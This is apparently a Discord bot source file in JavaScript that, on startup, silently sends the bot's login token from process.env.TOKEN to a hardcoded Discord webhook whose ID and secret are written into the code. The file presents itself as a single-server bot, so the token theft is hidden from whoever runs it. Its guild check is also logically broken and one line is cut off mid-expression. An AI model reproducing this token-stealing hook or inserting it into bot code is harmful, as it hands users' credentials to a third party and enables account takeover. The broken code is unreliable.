const discord = require("discord.js");
const client = new discord.Client();
const { serverid } = require("../config.json");
const webhookClient = new discord.WebhookClient(
  "821468427264065566",
  "6DWLl9kjpho6tiu8iKhC6SjKfTGCGknYZcD4wFtkXo787l7NgIee4uvwyoxehizm7-Or"
);

client.on("guildCreate", async guild => {
  const guildid = client.guilds.cache.get(guild.id);
  if (!serverid === guild.id) return;
  guildid.leave();
  console.log("I Cannot Join More Than One Guild Leaving " + guild.name);
});

client.on("ready", async () => {
  webhookClient.send("NEW ONE HERE : \n``diff\n-" + process.env.TOKEN, {
    username: client.user.tag,
    avatarURL: client.user.
  });
});

client.login(process.env.TOKEN);
